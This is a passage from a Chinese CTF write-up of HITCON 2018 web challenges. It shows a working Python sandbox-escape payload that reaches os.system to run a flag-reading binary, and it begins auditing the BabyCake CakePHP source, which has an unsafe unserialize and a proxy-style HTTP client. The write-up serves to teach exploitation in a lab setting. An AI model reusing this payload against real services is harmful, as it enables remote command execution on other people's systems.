    drwxr-xr-x  23 root root  4096 Oct 16 08:18 ..
    drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
    drwxr-xr-x   3 root root  4096 Oct 10 06:46 boot
    drwxr-xr-x  15 root root  2980 Oct  8 18:13 dev
    drwxr-xr-x  91 root root  4096 Oct 11 16:05 etc
    -r--------   1 root root    47 Oct 16 08:15 flag
    drwxr-xr-x   4 root root  4096 Oct 11 16:02 home
    lrwxrwxrwx   1 root root    31 Oct 10 06:46 initrd.img -> boot/initrd.img-4.15.0-1023-aws
    lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
    drwxr-xr-x  20 root root  4096 Oct 11 15:27 lib
    drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
    drwx------   2 root root 16384 Sep 12 16:10 lost+found
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
    dr-xr-xr-x 127 root root     0 Oct  8 18:13 proc
    -rwsr-sr-x   1 root root  8568 Oct 16 08:18 read_flag
    drwx------   4 root root  4096 Oct 16 08:18 root
    drwxr-xr-x  26 root root  1000 Oct 22 06:21 run
    drwxr-xr-x   2 root root  4096 Oct 10 06:46 sbin
    drwxr-xr-x   5 root root  4096 Oct  8 18:13 snap
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
    dr-xr-xr-x  13 root root     0 Oct 16 08:18 sys
    drwxrwxrwt  12 root root  4096 Oct 22 09:33 tmp
    drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
    drwxr-xr-x  14 root root  4096 Oct 11 15:58 var
    lrwxrwxrwx   1 root root    28 Oct 10 06:46 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
    lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
根据我们列出的根目录，很明显只要执行 `read_flag` 就能读到 flag，所以继续构造：
    # exec
    {'m':'p','l':'${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=="catch_warnings"][0]()._module.__builtins__):getthem["__import__"]("os").system("/read_flag / > /tmp/1.txt"))()}'}
    # read flag
    {'m':'d','f':'/tmp/1.txt'}
即可获得 flag：`hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}`
## BabyCake
赛后学习的一道题目，代码审计的能力还是太弱了（。_。）参考了 PDKT-Team 的 [writeup](https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake)，该解答讲的非常清晰，值得一看。
题目直接给了本题源码： 
访问题目所给的 demo 页面，可以看到和正常的页面相比，多了 ``，可以由此来定位源代码：`src/ControllerPagesController.php`:
    headers = $headers;
            $this->body = $body;
        }
    }
    class PagesController extends AppController {
        private function httpclient($method, $url, $headers, $data) {
            $options = [
                'headers' => $headers, 
                'timeout' => 10
            ];
            $http = new Client();
            return $http->$method($url, $data, $options);
        }
        private function back() {
            return $this->render('pages');
        }
        private function _cache_dir($key){
            $ip = $this->request->getEnv('REMOTE_ADDR');
            $index = sprintf('mycache/%s/%s/', $ip, $key);
            return CACHE . $index;
        }
        private function cache_set($key, $response) {
            $cache_dir = $this->_cache_dir($key);
            if ( !file_exists($cache_dir) ) {
                mkdir($cache_dir, 0700, true);
                file_put_contents($cache_dir . "body.cache", $response->body);
                file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
            }
        }
        private function cache_get($key) {
            $cache_dir = $this->_cache_dir($key);
            if (file_exists($cache_dir)) {
                $body   = file_get_contents($cache_dir . "/body.cache");
                $headers = file_get_contents($cache_dir . "/headers.cache");
                $body = "\n" . $body;
                $headers = unserialize($headers);
                return new DymmyResponse($headers, $body);
            } else {
                return null;
            }
        }
        public function display(...$path) {    
            $request  = $this->request;
            $data = $request->getQuery('data');
            $url  = $request->getQuery('url');
            if (strlen($url) == 0) 
                return $this->back();
            $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );
            if (strlen($scheme) == 0 || !in_array($scheme, ['http', 'https']))
                return $this->back();
            $method = strtolower( $request->getMethod() );
            if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
                return $this->back();
            $headers = [];
            foreach ($request->getHeaders() as $key => $value) {
                if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
                    continue;
                if (count($value) == 0)
                    continue;
                $headers[$key] = $value[0];
            }
            $key = md5($url);
            if ($method == 'get') {
                $response = $this->cache_get($key);
                if (!$response) {
                    $response = $this->httpclient($method, $url, $headers, null);
                    $this->cache_set($key, $response);                
                }
            } else {
                $response = $this->httpclient($method, $url, $headers, $data);
            }
            foreach ($response->headers as $key => $value) {
                if (strtolower($key) == 'content-type') {
                    $this->response->type(array('type' => $value));
                    $this->response->type('type');
                    continue;
                }
                $this->response->withHeader($key, $value);
            }
            $this->response->body($response->body);
            return $this->response;
        }
    }
简单梳理题目的处理逻辑：
首先题目只支持 `http` \ `https` 两种协议， 和 `get` \ `post` \ `put` \ `delete` \ `patch`
等五种方法。
继续看 `display` 函数，`$data = $request->getQuery('data');` 和 `$url =
$request->getQuery('url');` 从 querystring 中获得了需要访问的 url，已经需要传递的
data。随后该函数会根据方法的不同尝试不同的调用：
    if ($method == 'get') {
        $response = $this->cache_get($key);
        if (!$response) {
            $response = $this->httpclient($method, $url, $headers, null);
            $this->cache_set($key, $response);                
        }
    } else {
        $response = $this->httpclient($method, $url, $headers, $data);
    }
如果调用的方法是 `get`，函数先会尝试调用 `$this->cache_get($key);`，可以看到我们在之前注意到的注释就是在这里添加的：
`$body = "\n" . $body;` 。该函数还有一个需要注意的点是一个反序列化的操作：
`unserialize($headers);`，一般反序列化的操作在 CTF 题目中都是相当重要的考点，本题也不例外，虽然考察的点不在此处。
然后如果 `response` 为空的话，说明缓存不存在，程序会调用自身的 http clinet 去请求相应内容
`$this->httpclient($method, $url, $headers, null);`，然后将相应的 response 缓存
`$this->cache_set($key, $response);`。这里需要注意的是，`cache_set` 函数中会将相应的 header
序列化保存 `file_put_contents($cache_dir . "headers.cache",
serialize($response->headers));`。
如果调用的方法是 `post` 等其他方法的话，程序会直接调用自身的 http clinet 去请求相应内容。
然后向下看 cakephp 中对应 http client 的源码 `vendor/cakephp/cakephp/src/Http/Client.php`
可以看到源码中对一个请求的调用顺序如下：
  1. 首先调用 `post($url, $data = [], array $options = [])`
  2. 然后该函数会继续调用 `_doRequest($method, $url, $data, $options)`
  3. 紧接着该函数会通过 `$this->_createRequest($method, $url, $data, $options);` 构造 `$request` 对象
然后继续定位到 `vendor/cakephp/cakephp/src/Http/Client/Request.php`，可以看到构造函数会对我们传入的
data 做处理：
    public function __construct($url = '', $method = self::METHOD_GET, array $headers = [], $data = null)
    {
        $this->validateMethod($method);
        $this->method = $method;
        $this->uri = $this->createUri($url);
        $headers += [
            'Connection' => 'close',
            'User-Agent' => 'CakePHP'
        ];
        $this->addHeaders($headers);
        $this->body($data);
    }
    ...
    public function body($body = null)
    {
        if ($body === null) {
            $body = $this->getBody();
            return $body ? $body->__toString() : '';
        }
        if (is_array($body)) {
            $formData = new FormData();
            $formData->addMany($body);
            $this->header('Content-Type', $formData->contentType());
            $body = (string)$formData;
        }
        $stream = new Stream('php://memory', 'rw');
        $stream->write($body);
        $this->stream = $stream;
        return $this;
    }
我们可以看到，如果我们传入的 data 是数组类型的话，会调用
`vendor/cakephp/cakephp/src/Http/Client/FormData.php` 中定义的 `addMany`
函数，`addMany` 会逐次调用 `add` 函数，问题就出在 `add` 处，我们继续看源码：
    public function add($name, $value = null)